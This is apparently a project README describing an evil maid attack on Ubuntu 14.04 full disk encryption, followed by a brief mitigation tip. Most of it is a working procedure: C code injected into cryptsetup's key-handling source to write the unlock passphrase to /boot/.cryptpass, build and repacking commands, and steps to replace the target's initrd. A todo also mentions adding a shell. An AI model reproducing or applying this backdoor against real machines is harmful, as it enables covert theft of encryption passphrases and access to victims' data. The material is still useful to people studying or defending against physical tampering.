# evilmaid

Evil maid attacks are the biggest threat to full disk encryption, if you can't provide 100% physical security. It's not about locking your machine every time you leave for a coffee, it's about the leaving itself! A well-prepared attacker is able to backdoor your machine in just about [2 minutes][gds]. Amazing, isn't it?

Seems like a great technique for law enforcement agencies, *infect & raid*. At least in Germany there's evidence they used this attack multiple times as [taz.de][taz] reported it in 2011. So you should protect yourself, but first you need to understand how it's done.

### Target

Ubuntu 14.04.4 using full disk encryption (http://releases.ubuntu.com/14.04/ubuntu-14.04.4-desktop-i386.iso)

### Preparations

Get a live CD and physical access to your target system. Boot and prepare it:
```sh
$ apt-get install build-essential
$ apt-get build-dep cryptsetup
```
[Download][files] & extract files.zip, it contains the source of cryptsetup-1.6.1 and an extracted initrd.img-4.2.0-27-generic.

### Attack

You need to tamper keymanage.c located in files/cryptsetup/cryptsetup-1.6.1/lib/luks1 to record the passphrase & save it to /boot/.cryptpass. Go to line 905 and inject the following code:

```sh
out:
		if (r >= 0) {
			FILE *fp;
			system(“/bin/busybox mkdir /mntboot”);
			system(“/bin/busybox mount -t ext4 /dev/sda1 /mntboot”);
			fp = fopen(“/mntboot/.cryptpass”, “a”);
			fprintf(fp, “%s\n”, password);
			fclose(fp);
			system(“/bin/busybox umount /mntboot”);
		}
```
Switch to files/cryptsetup/cryptsetup-1.6.1/ and build your malicious library:

```sh
./configure
make
sudo dpkg-buildpackage
```
This will fail, because you didn't commit your changes yet, just do a dpkg-source --commit and try it again.
Now go to files/cryptsetup/ and extract the malicious library:
```sh
mkdir evil
dpkg -x libcryptsetup4_1.6.1-1ubuntu1_i386.deb evil
```
In files/cryptsetup/evil/lib you'll find the malicious library, libcryptsetup.so.4.5.0, copy it and replace files/initrd/lib/libcryptsetup.so.4 with it. Go to files/initrd to put it all together:
```sh
find . | cpio --quiet --dereference -o -H newc | gzip > files/initrd.img
```
Replace /boot/initrd.img-4.2.0-27-generic on the target system with your malicious initrd.img. The passphrase will be recorded to /boot/.cryptpass as soon as your target unlocks his/her encrypted drive. Recording the passphrase may seem lame, but there's [a lot more you can do][two] and I'm working on it, stay tuned!

### Mitigation

Do it like Mike Cardwell described it in [Protecting a Laptop from Simple and Sophisticated Attacks][mike]. Buy a strong and waterproof USB stick and store /boot on it.

* Corsair Flash Survivor Stealth 32GB USB 3.0 Flash Drive - https://www.amazon.com/Corsair-Flash-Survivor-Stealth-Drive/dp/B00YP5X1TI/

Don't feel safe, just because you don't use Ubuntu... ;-)

#### Todos

 - There's a shell needed :-D

   [gds]: <https://github.com/GDSSecurity/EvilAbigail/>
   [taz]: <http://www.taz.de/!5110130/>
   [files]: <https://dl.dropbox.com/s/mvg8g5fxd5wq7p8/files.zip?dl=0>
   [mike]: <https://grepular.com/Protecting_a_Laptop_from_Simple_and_Sophisticated_Attacks>
   [two]: <https://twopointfouristan.wordpress.com/2011/04/17/pwning-past-whole-disk-encryption/>
